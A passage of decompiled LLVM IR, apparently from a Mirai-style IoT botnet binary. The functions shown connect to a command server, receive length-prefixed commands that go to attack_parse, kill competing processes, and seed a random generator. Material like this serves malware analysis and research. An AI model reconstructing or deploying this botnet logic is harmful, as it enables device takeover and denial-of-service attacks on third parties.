  store i32 %v2_eaf4, i32* %ip.global-to-local, align 4
  %v2_edac = add i32 %v3_eda4, %v2_eaf4
  store i32 %v2_edac, i32* %r3.global-to-local, align 4
  %v1_edb0 = add i32 %v2_edac, -240
  %v2_edb0 = inttoptr i32 %v1_edb0 to i32*
  %v3_edb0 = load i32, i32* %v2_edb0, align 4
  %v1_edb4 = urem i32 %v2_ed94, 32
  %v6_edb8 = ashr i32 %v3_edb0, %v1_edb4
  store i32 %v6_edb8, i32* %r2.global-to-local, align 4
  %v1_edbc = urem i32 %v6_edb8, 2
  %v2_edbc = icmp eq i32 %v1_edbc, 0
  br i1 %v2_edbc, label %dec_label_pc_edc4, label %dec_label_pc_efe8

dec_label_pc_edc4:                                ; preds = %dec_label_pc_eda0, %dec_label_pc_ed90
  %v2_edc8 = load i8, i8* bitcast (i8** @global_var_235a8.139 to i8*), align 4
  %v3_edc8 = zext i8 %v2_edc8 to i32
  store i32 %v3_edc8, i32* @r4, align 4
  %v2_edcc = icmp eq i8 %v2_edc8, 0
  %v2_ee54 = load i32, i32* @global_var_23424.136, align 4
  br i1 %v2_edcc, label %dec_label_pc_ee54, label %dec_label_pc_edd4

dec_label_pc_edd4:                                ; preds = %dec_label_pc_edc4
  %v3_edd8 = udiv i32 %v2_ee54, 32
  store i32 %v2_eaf4, i32* %r2.global-to-local, align 4
  %v3_ede0 = mul nuw nsw i32 %v3_edd8, 4
  %v2_ede4 = add i32 %v3_ede0, %v2_eaf4
  store i32 %v2_ede4, i32* %r3.global-to-local, align 4
  %v1_ede8 = add i32 %v2_ede4, -368
  %v2_ede8 = inttoptr i32 %v1_ede8 to i32*
  %v3_ede8 = load i32, i32* %v2_ede8, align 4
  %v1_edec = urem i32 %v2_ee54, 32
  %v6_edf0 = ashr i32 %v3_ede8, %v1_edec
  store i32 %v6_edf0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_235a8.139 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_edfc = urem i32 %v6_edf0, 2
  %v2_edfc = icmp eq i32 %v1_edfc, 0
  store i8 0, i8* bitcast (i8** @global_var_235a8.139 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_23424.136 to i32), i32* @r5, align 4
  br i1 %v2_edfc, label %dec_label_pc_ee0c, label %dec_label_pc_ef78

dec_label_pc_ee0c:                                ; preds = %dec_label_pc_edd4
  store i32 60948, i32* @lr, align 4
  %v1_ee10 = icmp ne i32 %v2_ee54, -1
  call void @__pseudo_cond_branch(i1 %v1_ee10, i32 ptrtoint (i32* @global_var_15720.34 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_ee18 = load i32, i32* @r5, align 4
  %v2_ee18 = inttoptr i32 %v1_ee18 to i32*
  store i32 -1, i32* %v2_ee18, align 4
  %v1_ee20 = call i32 @sleep(i32 1)
  br label %dec_label_pc_ec54

dec_label_pc_ee28:                                ; preds = %dec_label_pc_ecd4
  store i32 %v2_eaf4, i32* %r2.global-to-local, align 4
  %v3_ee34 = mul nuw nsw i32 %v3_ee2c, 4
  %v2_ee38 = add i32 %v3_ee34, %v2_eaf4
  store i32 %v2_ee38, i32* %r3.global-to-local, align 4
  %v1_ee3c = add i32 %v2_ee38, -240
  %v2_ee3c = inttoptr i32 %v1_ee3c to i32*
  %v3_ee3c = load i32, i32* %v2_ee3c, align 4
  %v1_ee40 = urem i32 %v2_ee28, 32
  %v7_ee48 = shl i32 1, %v1_ee40
  %v8_ee48 = or i32 %v3_ee3c, %v7_ee48
  store i32 %v8_ee48, i32* %r2.global-to-local, align 4
  store i32 %v8_ee48, i32* %v2_ee3c, align 4
  br label %dec_label_pc_ed0c

dec_label_pc_ee54:                                ; preds = %dec_label_pc_edc4
  %v7_ee58 = icmp eq i32 %v2_ee54, -1
  store i32 ptrtoint (i32* @global_var_23424.136 to i32), i32* @r8, align 4
  br i1 %v7_ee58, label %dec_label_pc_ec54, label %dec_label_pc_ee64

dec_label_pc_ee64:                                ; preds = %dec_label_pc_ee54
  %v3_ee64 = udiv i32 %v2_ee54, 32
  store i32 %v2_eaf4, i32* %r2.global-to-local, align 4
  %v3_ee6c = mul nuw nsw i32 %v3_ee64, 4
  %v2_ee70 = add i32 %v3_ee6c, %v2_eaf4
  store i32 %v2_ee70, i32* %r3.global-to-local, align 4
  %v1_ee74 = add i32 %v2_ee70, -240
  %v2_ee74 = inttoptr i32 %v1_ee74 to i32*
  %v3_ee74 = load i32, i32* %v2_ee74, align 4
  %v1_ee78 = urem i32 %v2_ee54, 32
  %v6_ee7c = ashr i32 %v3_ee74, %v1_ee78
  store i32 %v6_ee7c, i32* %r2.global-to-local, align 4
  %v1_ee80 = urem i32 %v6_ee7c, 2
  %v2_ee80 = icmp eq i32 %v1_ee80, 0
  br i1 %v2_ee80, label %dec_label_pc_ec54, label %dec_label_pc_ee88

dec_label_pc_ee88:                                ; preds = %dec_label_pc_ee64
  %v6_ee8c = inttoptr i32 %v3_edc8 to i8*
  store i8* %v6_ee8c, i8** %stack_var_-42, align 4
  store i32 %v2_ef64, i32* @sl, align 4
  %v0_ee90 = call i32 @__GI___errno_location()
  %v0_ee94 = load i32, i32* @r4, align 4
  %v2_ee94 = inttoptr i32 %v0_ee90 to i32*
  store i32 %v0_ee94, i32* %v2_ee94, align 4
  store i32 %v0_ee90, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_eea4 = load i32, i32* @global_var_23424.136, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_eeb0 = call i32 @__libc_recv(i32 %v2_eea4, i32 %v2_ef64, i32 2, i32 16386)
  %v7_eeb4 = icmp eq i32 %v4_eeb0, -1
  br i1 %v7_eeb4, label %dec_label_pc_f094, label %dec_label_pc_eebc

dec_label_pc_eebc:                                ; preds = %dec_label_pc_ee88
  %v2_eebc = icmp eq i32 %v4_eeb0, 0
  br i1 %v2_eebc, label %dec_label_pc_f0a4, label %dec_label_pc_eec4

dec_label_pc_eec4:                                ; preds = %dec_label_pc_eebc
  store i32 %v2_ed80, i32* %ip.global-to-local, align 4
  %v3_eec8 = load i8*, i8** %stack_var_-42, align 4
  %v4_eec8 = ptrtoint i8* %v3_eec8 to i32
  store i32 %v4_eec8, i32* %r3.global-to-local, align 4
  %v2_eecc = icmp eq i8* %v3_eec8, null
  br i1 %v2_eecc, label %dec_label_pc_eed4, label %dec_label_pc_f0d4

dec_label_pc_eed4:                                ; preds = %dec_label_pc_eec4
  %v2_eed4 = load i32, i32* @global_var_23424.136, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_eee0 = add i32 %v4_eec8, 16384
  store i32 %v1_eee0, i32* %r3.global-to-local, align 4
  %v4_eee4 = call i32 @__libc_recv(i32 %v2_eed4, i32 %v2_ef64, i32 2, i32 %v1_eee0)
  br label %dec_label_pc_ec54

dec_label_pc_eeec:                                ; preds = %dec_label_pc_ecc4
  %v0_eef4 = load i32, i32* @r4, align 4
  store i32 %v0_eef4, i32* %r2.global-to-local, align 4
  %v3_eef8 = call i32 @socket(i32 2, i32 1, i32 %v0_eef4)
  %v7_eefc = icmp eq i32 %v3_eef8, -1
  store i32 %v3_eef8, i32* @r5, align 4
  %v1_ef04 = load i32, i32* @r8, align 4
  %v2_ef04 = inttoptr i32 %v1_ef04 to i32*
  store i32 %v3_eef8, i32* %v2_ef04, align 4
  br i1 %v7_eefc, label %dec_label_pc_ecd4, label %dec_label_pc_ef0c

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_eeec
  %v0_ef0c = load i32, i32* @r4, align 4
  store i32 %v0_ef0c, i32* @r2, align 4
  %v2_ef14 = call i32 @__libc_fcntl(i32 %v3_eef8, i32 3)
  %v1_ef1c = or i32 %v2_ef14, 2048
  store i32 %v1_ef1c, i32* @r2, align 4
  %v0_ef20 = load i32, i32* @r5, align 4
  %v2_ef24 = call i32 @__libc_fcntl(i32 %v0_ef20, i32 4)
  %v2_ef2c = load i32, i32* @global_var_23428.114, align 4
  store i32 %v2_ef2c, i32* %r3.global-to-local, align 4
  %v2_ef30 = icmp eq i32 %v2_ef2c, 0
  br i1 %v2_ef30, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_ef0c
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_ef0c, %bb42
  %v2_ef38 = xor i1 %v2_ef30, true
  call void @__pseudo_cond_branch(i1 %v2_ef38, i32 ptrtoint (i32* @global_var_11b60.141 to i32))
  store i32 ptrtoint (i8** @global_var_235a8.139 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_ef44 = load i32, i32* @global_var_23424.136, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_235a8.139 to i8*), align 4
  %v4_ef54 = call i32 @__libc_connect(i32 %v2_ef44, i32 ptrtoint (i16** @global_var_260c0.116 to i32), i32 16)
  br label %dec_label_pc_ecd4

dec_label_pc_ef5c:                                ; preds = %dec_label_pc_ed5c
  %v2_ef60 = load i32, i32* @global_var_23424.136, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_ef70 = call i32 @__libc_send(i32 %v2_ef60, i32 %v2_ef64, i32 2, i32 16384)
  br label %dec_label_pc_ed90

dec_label_pc_ef78:                                ; preds = %dec_label_pc_edd4
  store i32 4, i32* @r4, align 4
  store i32 %v2_ef80, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_ef5c, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_ef9c = call i32 @getsockopt(i32 %v2_ee54, i32 1, i32 4, i32 %v2_ef80, i32 %v2_ef5c)
  %v3_efa0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_efa0, i32* %r3.global-to-local, align 4
  %v2_efa4 = icmp eq i32 %v3_efa0, 0
  br i1 %v2_efa4, label %dec_label_pc_f030, label %dec_label_pc_efac

dec_label_pc_efac:                                ; preds = %dec_label_pc_ef78
  %v2_efac = load i32, i32* @global_var_23424.136, align 4
  %v1_efb0 = call i32 @__GI___libc_close(i32 %v2_efac)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_efb8 = load i32, i32* @r5, align 4
  %v2_efb8 = inttoptr i32 %v1_efb8 to i32*
  store i32 -1, i32* %v2_efb8, align 4
  %v0_efbc = call i32 @rand_next()
  %v3_efc4 = zext i32 %v0_efbc to i64
  %v4_efc4 = mul nuw i64 %v3_efc4, 3435973837
  %v7_efc4 = trunc i64 %v4_efc4 to i32
  store i32 %v7_efc4, i32* %ip.global-to-local, align 4
  %v3_efc82 = udiv i64 %v4_efc4, 34359738368
  %v3_efcc4 = mul nuw nsw i64 %v3_efc82, 8
  %v3_efcc = trunc i64 %v3_efcc4 to i32
  store i32 %v3_efcc, i32* %r2.global-to-local, align 4
  %v2_efd06 = mul nuw nsw i64 %v3_efc82, 2
  %v2_efd0 = trunc i64 %v2_efd06 to i32
  %v2_efd4 = add i32 %v3_efcc, %v2_efd0
  store i32 %v2_efd4, i32* %r3.global-to-local, align 4
  %v2_efd8 = sub i32 %v0_efbc, %v2_efd4
  %v1_efdc = add i32 %v2_efd8, 1
  %v1_efe0 = call i32 @sleep(i32 %v1_efdc)
  br label %dec_label_pc_ec54

dec_label_pc_efe8:                                ; preds = %dec_label_pc_eda0
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_ef80, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_effc = call i32 @__libc_accept(i32 %v2_ed94, i32 %v2_eff4, i32 %v2_ef80, i32 16, i32 16)
  %v1_f000 = call i32 @scanner_kill(i32 %v5_effc)
  %v1_f004 = call i32 @killer_kill(i32 %v1_f000)
  %v2_f014 = call i32 @kill(i32 %v1_f010, i32 9)
  store i32 ptrtoint (i32* @global_var_235a4.126 to i32), i32* %r3.global-to-local, align 4
  %v2_f01c = load i32, i32* @global_var_235a4.126, align 4
  %v2_f020 = icmp eq i32 %v2_f01c, 0
  br i1 %v2_f020, label %dec_label_pc_f028, label %dec_label_pc_f0c8

dec_label_pc_f028:                                ; preds = %dec_label_pc_efe8, %dec_label_pc_f0c8
  %v1_f02c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_f030

dec_label_pc_f030:                                ; preds = %dec_label_pc_ef78, %dec_label_pc_f028
  %v2_f034 = call i32 @util_strlen(i8* %v1_f034)
  %sext = mul i32 %v2_f034, 16777216
  %v1_f038 = sdiv i32 %sext, 16777216
  %v7_f038 = inttoptr i32 %v1_f038 to i8*
  store i8* %v7_f038, i8** %stack_var_-42, align 4
  %v0_f03c = call i32 @util_local_addr()
  store i32 ptrtoint (i32* @global_var_260b8.92 to i32), i32* @lr, align 4
  %v0_f044 = load i32, i32* @r4, align 4
  store i32 %v0_f044, i32* %r2.global-to-local, align 4
  store i32 %v0_f03c, i32* @global_var_260b8.92, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_f054 = load i32, i32* @r5, align 4
  %v1_f054 = inttoptr i32 %v0_f054 to i32*
  %v2_f054 = load i32, i32* %v1_f054, align 4
  %v4_f058 = call i32 @__libc_send(i32 %v2_f054, i32 ptrtoint (i32* @global_var_1a7bc.145 to i32), i32 %v0_f044, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v0_f064 = load i32, i32* @r5, align 4
  %v1_f064 = inttoptr i32 %v0_f064 to i32*
  %v2_f064 = load i32, i32* %v1_f064, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_f070 = call i32 @__libc_send(i32 %v2_f064, i32 %v2_ef64, i32 1, i32 16384)
  %v3_f074 = load i8*, i8** %stack_var_-42, align 4
  %v4_f074 = ptrtoint i8* %v3_f074 to i32
  store i32 %v4_f074, i32* %r2.global-to-local, align 4
  %v3_f078 = icmp eq i8* %v3_f074, null
  br i1 %v3_f078, label %dec_label_pc_ec54, label %dec_label_pc_f080

dec_label_pc_f080:                                ; preds = %dec_label_pc_f030
  %v0_f080 = load i32, i32* @r5, align 4
  %v1_f080 = inttoptr i32 %v0_f080 to i32*
  %v2_f080 = load i32, i32* %v1_f080, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_f08c = call i32 @__libc_send(i32 %v2_f080, i32 %v2_ea90, i32 %v4_f074, i32 16384)
  br label %dec_label_pc_ec54

dec_label_pc_f094:                                ; preds = %dec_label_pc_f104, %dec_label_pc_ee88
  %v0_f094 = load i32, i32* @r5, align 4
  %v1_f094 = inttoptr i32 %v0_f094 to i32*
  %v2_f094 = load i32, i32* %v1_f094, align 4
  store i32 %v2_f094, i32* %r3.global-to-local, align 4
  %v7_f098 = icmp eq i32 %v2_f094, 4
  br i1 %v7_f098, label %dec_label_pc_ec54, label %bb44

bb44:                                             ; preds = %dec_label_pc_f094
  %v8_f09c = icmp eq i32 %v2_f094, 11
  br i1 %v8_f09c, label %dec_label_pc_ec54, label %dec_label_pc_f0a4

dec_label_pc_f0a4:                                ; preds = %dec_label_pc_f128, %bb44, %dec_label_pc_eebc
  %v2_f0a4 = load i32, i32* @global_var_23424.136, align 4
  store i32 61616, i32* @lr, align 4
  %v1_f0ac = icmp ne i32 %v2_f0a4, -1
  call void @__pseudo_cond_branch(i1 %v1_f0ac, i32 ptrtoint (i32* @global_var_15720.34 to i32))
  store i32 ptrtoint (i32* @global_var_23424.136 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_23424.136, align 4
  %v1_f0c0 = call i32 @sleep(i32 1)
  br label %dec_label_pc_ec54

dec_label_pc_f0c8:                                ; preds = %dec_label_pc_efe8
  %v2_f0cc = call i32 @kill(i32 %v2_f01c, i32 9)
  br label %dec_label_pc_f028

dec_label_pc_f0d4:                                ; preds = %dec_label_pc_eec4
  %v3_f0d4 = udiv i32 %v4_eec8, 256
  %v1_f0d8 = urem i32 %v4_eec8, 256
  store i32 %v1_f0d8, i32* %r3.global-to-local, align 4
  %v4_f0dc = mul nuw nsw i32 %v1_f0d8, 256
  %v5_f0dc = or i32 %v4_f0dc, %v3_f0d4
  %v6_f0dc = trunc i32 %v5_f0dc to i16
  store i32 %v5_f0dc, i32* %r2.global-to-local, align 4
  store i32 %v2_ed80, i32* @lr, align 4
  %v7_f0e8 = inttoptr i32 %v5_f0dc to i8*
  store i8* %v7_f0e8, i8** %stack_var_-42, align 4
  %tmp45 = icmp ult i16 %v6_f0dc, 1025
  br i1 %tmp45, label %dec_label_pc_f104, label %dec_label_pc_f0f0

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f0d4
  %v2_f0f0 = load i32, i32* @global_var_23424.136, align 4
  %v1_f0f4 = call i32 @__GI___libc_close(i32 %v2_f0f0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_f0fc = load i32, i32* @r8, align 4
  %v2_f0fc = inttoptr i32 %v1_f0fc to i32*
  store i32 -1, i32* %v2_f0fc, align 4
  br label %dec_label_pc_ec54

dec_label_pc_f104:                                ; preds = %dec_label_pc_f0d4
  %v0_f104 = load i32, i32* @r4, align 4
  %v1_f104 = load i32, i32* @r5, align 4
  %v2_f104 = inttoptr i32 %v1_f104 to i32*
  store i32 %v0_f104, i32* %v2_f104, align 4
  store i32 %v2_f10c, i32* @r4, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_f114 = load i32, i32* @global_var_23424.136, align 4
  %v7_f11c = call i32 @__libc_recv(i32 %v2_f114, i32 %v2_f10c, i32 %v5_f0dc, i32 16386)
  %v7_f120 = icmp eq i32 %v7_f11c, -1
  br i1 %v7_f120, label %dec_label_pc_f094, label %dec_label_pc_f128

dec_label_pc_f128:                                ; preds = %dec_label_pc_f104
  %v2_f128 = icmp eq i32 %v7_f11c, 0
  br i1 %v2_f128, label %dec_label_pc_f0a4, label %dec_label_pc_f130

dec_label_pc_f130:                                ; preds = %dec_label_pc_f128
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_f13c = load i32, i32* @global_var_23424.136, align 4
  %v4_f140 = call i32 @__libc_recv(i32 %v2_f13c, i32 %v2_ef64, i32 2, i32 16384)
  %v3_f148 = load i8*, i8** %stack_var_-42, align 4
  %v4_f148 = ptrtoint i8* %v3_f148 to i32
  %v3_f14c = udiv i32 %v4_f148, 256
  %v1_f150 = mul i32 %v4_f148, 256
  %v4_f154 = and i32 %v1_f150, 65280
  %v5_f154 = or i32 %v4_f154, %v3_f14c
  store i32 %v5_f154, i32* %ip.global-to-local, align 4
  store i32 %v2_ed80, i32* @lr, align 4
  store i32 %v5_f154, i32* %r2.global-to-local, align 4
  %v2_f164 = load i32, i32* @global_var_23424.136, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_f16c = inttoptr i32 %v5_f154 to i8*
  store i8* %v6_f16c, i8** %stack_var_-42, align 4
  %v6_f170 = call i32 @__libc_recv(i32 %v2_f164, i32 %v2_f10c, i32 %v5_f154, i32 16384)
  store i32 %v2_ed80, i32* %r2.global-to-local, align 4
  %v3_f178 = load i8*, i8** %stack_var_-42, align 4
  %v3_f17c = icmp eq i8* %v3_f178, null
  br i1 %v3_f17c, label %dec_label_pc_ec54, label %dec_label_pc_f184

dec_label_pc_f184:                                ; preds = %dec_label_pc_f130
  %v4_f178 = ptrtoint i8* %v3_f178 to i32
  %v5_f188 = call i32 @attack_parse(i32* nonnull %stack_var_-1432, i32 %v4_f178, i32 %v2_ed80)
  br label %dec_label_pc_ec54

; uselistorder directives
  uselistorder i8* %v3_f178, { 1, 0 }
  uselistorder i32 %v5_f154, { 1, 0, 2, 3 }
  uselistorder i32 %v7_f11c, { 1, 0 }
  uselistorder i32 %v5_f0dc, { 1, 0, 3, 2 }
  uselistorder i32 %v3_eef8, { 3, 2, 1, 0 }
  uselistorder i32 %v4_eec8, { 1, 0, 2, 3 }
  uselistorder i32 %v4_eeb0, { 1, 0 }
  uselistorder i32 %v2_ee54, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v2_ed94, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-1436.1, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_ed7c, { 1, 0, 2 }
  uselistorder i32 %v5_ed48, { 1, 2, 0 }
  uselistorder i32 %v2_ec94, { 2, 1, 0 }
  uselistorder i32 %v1_ec84, { 1, 2, 0 }
  uselistorder i32 %v1_ec68, { 1, 2, 0 }
  uselistorder i32 %stack_var_-1436.0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v2_ef80, { 1, 0, 2, 3 }
  uselistorder i32 %v2_ef64, { 3, 0, 5, 4, 2, 1 }
  uselistorder i32 %v2_ef5c, { 1, 0 }
  uselistorder i32 %v2_ed80, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v2_ec50, { 1, 0, 2 }
  uselistorder i32 %v2_eaf4, { 0, 12, 1, 13, 2, 11, 3, 10, 4, 5, 9, 8, 6, 14, 7 }
  uselistorder i32 %v2_eae0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-152, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 26, 27, 28, 30, 29, 33, 31, 32, 24, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 7, 8, 9, 5, 6, 10, 11 }
  uselistorder i32* @global_var_235a4.126, { 1, 2, 0 }
  uselistorder i8* null, { 1, 3, 2, 4, 0 }
  uselistorder i32 16386, { 1, 3, 0, 4, 2, 5 }
  uselistorder i32 (i32)* @sleep, { 9, 8, 3, 1, 2, 7, 6, 5, 4, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_235a8.139 to i32), { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_235a8.139 to i8*), { 0, 1, 3, 2 }
  uselistorder i32* @global_var_23420.121, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9 }
  uselistorder i32* @global_var_23424.136, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i8*, i32)* @util_strcpy, { 20, 21, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 22, 3, 23, 4, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61 }
  uselistorder i32 (i32, i32)* @rand_alphastr, { 1, 0, 10, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32* @global_var_23428.114, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_e764.112 to i32), { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %dec_label_pc_f030, { 1, 0 }
  uselistorder label %dec_label_pc_f028, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_ed90, { 2, 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_ecd4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ecc4, { 1, 0 }
  uselistorder label %dec_label_pc_ec54, { 7, 1, 8, 9, 2, 0, 10, 3, 11, 12, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_eab4, { 2, 0, 1 }
}

define i32 @function_f1b8(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f1b8:
  %v0_f1b8 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_f1b8, i32 -22307732)
  %v0_f1c0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f1c0, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1b8
  %v1_f1c4 = load i32, i32* @sl, align 4
  %v2_f1c4 = trunc i32 %v1_f1c4 to i16
  store i16 %v2_f1c4, i16* %arg1, align 2
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1b8, %bb
  %v10_f1c4 = load i32, i32* @r0, align 4
  ret i32 %v10_f1c4

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_f1d4 = load i32, i32* @global_var_235ac.147, align 4
  %v2_f1d8 = load i32, i32* @global_var_235b8.149, align 4
  %v4_f1e4 = mul i32 %v2_f1d4, 2048
  %v5_f1e4 = xor i32 %v4_f1e4, %v2_f1d4
  %v4_f1e8 = udiv i32 %v2_f1d8, 524288
  %v5_f1e8 = xor i32 %v4_f1e8, %v2_f1d8
  %v2_f1ec = load i32, i32* @global_var_235b0.151, align 4
  %v2_f1f0 = load i32, i32* @global_var_235b4.153, align 4
  %v2_f1f4 = xor i32 %v5_f1e8, %v5_f1e4
  %v4_f1f8 = udiv i32 %v5_f1e4, 256
  %v5_f1f8 = xor i32 %v2_f1f4, %v4_f1f8
  store i32 %v2_f1ec, i32* @global_var_235ac.147, align 4
  store i32 %v2_f1f0, i32* @global_var_235b0.151, align 4
  store i32 %v2_f1d8, i32* @global_var_235b4.153, align 4
  store i32 %v5_f1f8, i32* @global_var_235b8.149, align 4
  ret i32 %v5_f1f8

; uselistorder directives
  uselistorder i32 %v2_f1d8, { 2, 1, 0 }
  uselistorder i32 %v2_f1d4, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f230 = call i32 @__GI_time(i32* null)
  store i32 %v2_f230, i32* @global_var_235ac.147, align 4
  %v1_f23c = call i32 @__getpid(i32 %v2_f230)
  store i32 %v1_f23c, i32* @r0, align 4
  %v0_f244 = call i32 @getppid()
  %v2_f24c = xor i32 %v1_f23c, %v0_f244
  store i32 %v2_f24c, i32* @global_var_235b0.151, align 4
  %v1_f254 = call i32 @clock(i32 %v2_f24c)
  %v2_f258 = load i32, i32* @global_var_235b0.151, align 4
  %v2_f264 = xor i32 %v2_f258, %v1_f254
  store i32 %v2_f264, i32* @global_var_235b8.149, align 4
  store i32 %v1_f254, i32* @global_var_235b4.153, align 4
  ret i32 %v1_f254

; uselistorder directives
  uselistorder i32 %v1_f254, { 1, 2, 0 }
}

define i32 @rand_alphastr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_f28c = load i32, i32* @r4, align 4
  %v6_f28c = load i32, i32* @r5, align 4
  %v9_f28c = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_f2a0 = call i32 @table_unlock_val(i32 61)
  %v3_f2ac = call i32 @table_retrieve_val(i32 61, i32* null)
  store i32 %v3_f2ac, i32* @r1, align 4
  %v2_f2b8 = bitcast i32* %stack_var_-72 to i8*
  %v3_f2b8 = call i32 @strcpy(i8* %v2_f2b8, i32 %v3_f2ac)
  %v2_f2bc = icmp eq i32 %arg2, 0
  br i1 %v2_f2bc, label %dec_label_pc_f338, label %dec_label_pc_f2c4

dec_label_pc_f2c4:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_235ac.147 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_235b0.151 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_235b4.153 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_235b8.149 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_f31c = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_f2d8

dec_label_pc_f2d8:                                ; preds = %dec_label_pc_f2d8.dec_label_pc_f2d8_crit_edge, %dec_label_pc_f2c4
  %v1_f2fc = phi i32 [ %v1_f2fc.pre, %dec_label_pc_f2d8.dec_label_pc_f2d8_crit_edge ], [ ptrtoint (i32* @global_var_235ac.147 to i32), %dec_label_pc_f2c4 ]
  %v2_f2d8 = load i32, i32* @global_var_235b8.149, align 4
  store i32 %v2_f2d8, i32* %r2.global-to-local, align 4
  %v2_f2dc = load i32, i32* @global_var_235ac.147, align 4
  %v4_f2e0 = udiv i32 %v2_f2d8, 524288
  %v5_f2e0 = xor i32 %v4_f2e0, %v2_f2d8
  %v4_f2e4 = mul i32 %v2_f2dc, 2048
  %v5_f2e4 = xor i32 %v4_f2e4, %v2_f2dc
  %v2_f2e8 = xor i32 %v5_f2e0, %v5_f2e4
  %v2_f2ec = load i32, i32* @global_var_235b0.151, align 4
